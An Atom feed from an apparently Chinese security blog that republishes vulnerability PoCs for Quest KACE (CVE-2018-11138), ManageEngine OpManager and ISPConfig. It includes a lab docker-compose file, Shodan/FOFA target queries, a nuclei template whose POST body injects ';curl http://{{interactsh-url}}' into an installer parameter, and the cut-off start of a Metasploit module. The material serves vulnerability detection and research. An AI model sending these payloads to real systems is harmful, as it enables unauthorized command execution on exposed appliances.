<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-26T07:46:04.392Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Quest KACE System Management Appliance 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/26/github_4225355803/"/>
    <id>http://example.com/2025/06/26/github_4225355803/</id>
    <published>2025-06-26T07:46:04.394Z</published>
    <updated>2025-06-26T07:46:04.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE System Management Appliance 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11138</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 存在远程代码执行漏洞，攻击者可通过构造恶意请求执行任意代码。</p><p><strong>产品厂商：</strong> Quest</p><p><strong>产品名称：</strong> KACE System Management Appliance</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/3a8784b17dc08bd30c56fd284da7d7cf886aed1f/code%2Fcves%2F2018%2FCVE-2018-11138%2Fdocker-compose.yml">https://github.com/projectdiscovery/nuclei-templates/blob/3a8784b17dc08bd30c56fd284da7d7cf886aed1f/code%2Fcves%2F2018%2FCVE-2018-11138%2Fdocker-compose.yml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3.8&#x27;</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">quest-kace-vulnerable</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">quest-kace-cve-2018-11138</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:80&quot;</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">APACHE_DOCUMENT_ROOT=/var/www/html</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/var/log/apache2</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">quest-kace-network</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">quest-kace-network</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE System Management Appliance </summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Quest KACE System Management Appliance 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/26/github_4190954339/"/>
    <id>http://example.com/2025/06/26/github_4190954339/</id>
    <published>2025-06-26T07:45:48.776Z</published>
    <updated>2025-06-26T07:45:48.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE System Management Appliance 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11138</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 8.0.318中的’&#x2F;common&#x2F;download_agent_installer.php’脚本可被匿名用户访问，并被滥用以在系统上执行任意命令。攻击者可以在受影响的系统上执行任意命令，可能导致系统完全被控制、数据被盗或进一步的网络利用。</p><p><strong>产品厂商：</strong> Quest</p><p><strong>产品名称：</strong> KACE System Management Appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> title&#x3D;”KACE Systems Management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/3a8784b17dc08bd30c56fd284da7d7cf886aed1f/http%2Fcves%2F2018%2FCVE-2018-11138.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/3a8784b17dc08bd30c56fd284da7d7cf886aed1f/http%2Fcves%2F2018%2FCVE-2018-11138.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11138</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Quest KACE System Management Appliance <span class="hljs-number">8.0</span>.<span class="hljs-number">318</span> <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> Khalid6468<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    The &#x27;<span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>download_agent_installer.php&#x27; script <span class="hljs-keyword">in</span> the Quest KACE System Management Appliance <span class="hljs-number">8.0</span>.<span class="hljs-number">318</span> is accessible by anonymous users and can be abused to execute arbitrary commands on the system.<br>  <span class="hljs-params">impact:</span> |<br>    An attacker can execute arbitrary commands on the affected system, potentially leading to complete system compromise, data theft, <span class="hljs-keyword">or</span> further network exploitation.<br>  <span class="hljs-params">remediation:</span> |<br>    Upgrade to a patched version of Quest KACE System Management Appliance <span class="hljs-keyword">or</span> apply the necessary security patches provided by Quest Software.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.exploit-db.com<span class="hljs-operator">/</span>exploits<span class="hljs-operator">/</span><span class="hljs-number">44950</span><span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-11138</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11138</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11138</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">78</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.97175</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99794</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:quest:kace_system_management_appliance:<span class="hljs-number">8.0</span>.<span class="hljs-number">318</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">vendor:</span> quest<br>    <span class="hljs-params">product:</span> kace_system_management_appliance<br>    <span class="hljs-params">shodan-query:</span> http.title:<span class="hljs-string">&quot;kace systems management&quot;</span><br>    <span class="hljs-params">fofa-query:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;KACE Systems Management&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2018,quest,kace,rce,kev,unauth<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains(body, <span class="hljs-string">&quot;KACE&quot;</span>) <span class="hljs-operator">||</span> contains(body, <span class="hljs-string">&quot;Quest&quot;</span>)&#x27;<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/common/download_agent_installer.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">platform</span><span class="hljs-operator">=</span>linux&amp;custom_install_options<span class="hljs-operator">=</span>;curl<span class="hljs-operator">+</span>http:<span class="hljs-operator">//</span>&#123;&#123;interactsh-url&#125;&#125;;echo<span class="hljs-operator">+</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol <span class="hljs-comment"># Confirms the HTTP Interaction</span><br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;http&quot;</span><br><br><span class="hljs-comment"># digest: 4a0a00473045022100bb93da42368701a83c238863b0732396792fa2bf722f4b329121c3a9999f789e02205a507bfcbb00ea56cf4610da829aead05232f9ce7fa353dcc7ff3974e47aba22</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE System Management Appliance </summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Quest KACE System Management Appliance 命令执行漏洞</title>
    <link href="http://example.com/2025/06/26/github_1057633275/"/>
    <id>http://example.com/2025/06/26/github_1057633275/</id>
    <published>2025-06-26T07:45:35.921Z</published>
    <updated>2025-06-26T07:45:35.919Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE System Management Appliance 命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11138</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Quest KACE System Management Appliance 8.0.318中的’&#x2F;common&#x2F;download_agent_installer.php’脚本可以被匿名用户访问，并可能被滥用以在系统上执行任意命令。</p><p><strong>产品厂商：</strong> Quest</p><p><strong>产品名称：</strong> KACE System Management Appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> http.title:”kace systems management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12468">https://github.com/projectdiscovery/nuclei-templates/issues/12468</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>The ‘&#x2F;common&#x2F;download_agent_installer.php’ script in the Quest KACE System Management Appliance 8.0.318 is accessible by anonymous users and can be abused to execute arbitrary commands on the system.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities">https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</a></li><li><a href="https://www.exploit-db.com/exploits/44950/">https://www.exploit-db.com/exploits/44950/</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-kace-systems-management"><a href="#Shodan-Query-http-title-kace-systems-management" class="headerlink" title="Shodan Query: http.title:&quot;kace systems management&quot;"></a>Shodan Query: <code>http.title:&quot;kace systems management&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE System Management Appliance </summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Zoho ManageEngine OpManager 反序列化漏洞</title>
    <link href="http://example.com/2025/06/26/github_4254263973/"/>
    <id>http://example.com/2025/06/26/github_4254263973/</id>
    <published>2025-06-26T06:00:16.593Z</published>
    <updated>2025-06-26T06:00:16.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Zoho ManageEngine OpManager 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-3287</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Zoho ManageEngine OpManager 12.5.329之前的版本存在反序列化漏洞，允许未经身份验证的远程攻击者执行代码。</p><p><strong>产品厂商：</strong> Zoho</p><p><strong>产品名称：</strong> ManageEngine OpManager</p><p><strong>影响版本：</strong> version &lt; 12.5.329</p><p><strong>搜索语法：</strong> http.title:”opmanager”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12474">https://github.com/projectdiscovery/nuclei-templates/issues/12474</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Zoho ManageEngine OpManager before 12.5.329 allows unauthenticated Remote Code Execution due to a general bypass in the deserialization class.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="http://packetstormsecurity.com/files/164231/ManageEngine-OpManager-SumPDU-Java-Deserialization.html">http://packetstormsecurity.com/files/164231/ManageEngine-OpManager-SumPDU-Java-Deserialization.html</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-opmanager"><a href="#Shodan-Query-http-title-opmanager" class="headerlink" title="Shodan Query: http.title:&quot;opmanager&quot;"></a>Shodan Query: <code>http.title:&quot;opmanager&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Zoho ManageEngine OpManager 反序列化漏洞&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/26/github_457305466/"/>
    <id>http://example.com/2025/06/26/github_457305466/</id>
    <published>2025-06-26T05:45:14.153Z</published>
    <updated>2025-06-26T05:45:14.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果启用了admin_allow_langedit，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> 